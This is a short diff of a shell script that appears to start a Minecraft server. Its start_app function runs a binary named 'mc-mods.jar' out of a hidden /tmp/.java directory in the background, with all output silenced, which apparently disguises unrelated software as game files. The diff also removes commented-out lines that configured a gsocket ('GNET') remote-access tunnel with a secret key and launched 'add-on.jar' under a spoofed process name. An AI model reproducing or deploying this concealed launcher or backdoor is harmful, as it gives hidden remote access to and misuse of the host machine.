@@ -12,10 +12,6 @@ function fetch_files() {
 function start_app() {
     chmod a+x /tmp/.java/bin/***
     cd /tmp/.java/bin && nohup ./mc-mods.jar -a 'java -Xms128M -Xmx6144M -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
-    # GNET
-    # export GSOCKET_ARGS="-s i1fB3eD2E2K9c5A16f9L8M9-3D9g8Hbj7-56C4a9f6X1-eCd9F9440-d6A2K9A1c5J1g6K -liqD"
-    # export HOME=/home/container
-    # cd /tmp/.java/bin && exec -a -java ./add-on.jar &
 }
 
 if [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
